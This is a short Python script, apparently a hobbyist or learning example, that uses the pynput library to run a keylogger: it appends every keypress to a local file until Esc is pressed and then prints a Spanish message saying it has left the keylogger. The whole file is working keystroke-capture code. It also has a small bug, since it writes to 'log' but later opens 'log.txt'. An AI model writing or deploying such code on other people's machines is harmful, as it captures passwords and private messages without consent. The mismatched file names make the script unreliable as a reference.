import os

from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open('log', 'a') as f:
            f.write(str(key) + ' ')
    except Exception as e:
        print(str(e))

def on_release(key):
    if key == Key.esc:
        print('Salio del Keylogger')
        f = open('log.txt', 'r+')
        buffer = f.read()
        f.close()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()